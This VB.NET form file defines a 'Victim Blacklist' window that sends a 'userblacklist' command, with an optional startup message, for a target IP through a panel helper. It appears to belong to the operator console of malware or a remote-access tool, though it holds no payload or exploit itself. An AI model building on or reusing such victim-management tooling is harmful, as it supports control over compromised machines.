Imports System.Net

Public Class Blacklist
    Public targetIp As String
    Private Sub Blacklist_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Name = "Victim Blacklist - " & targetIp
    End Sub

    Private Sub startupMsgCB_CheckedChanged(sender As Object, e As EventArgs) Handles startupMsgCB.CheckedChanged
        startupMsgTB.Enabled = startupMsgCB.Checked
        blacklistBTN.Enabled = Not startupMsgCB.Checked
    End Sub

    Private Sub startupMsgTB_TextChanged(sender As Object, e As EventArgs) Handles startupMsgTB.TextChanged
        blacklistBTN.Enabled = startupMsgTB.Text.Trim <> ""
    End Sub

    Private Sub blacklistBTN_Click(sender As Object, e As EventArgs) Handles blacklistBTN.Click
        If Utils.DirectPanelCommand(targetIp, New WebClient(),
                                    "Are you sure you want to *permanently* blacklist this IP ?", "userblacklist", {startupMsgTB.Text}) Then
            MsgBox("Successfully blacklisted " & targetIp, MsgBoxStyle.Information)
            Me.Close()
        End If
    End Sub
End Class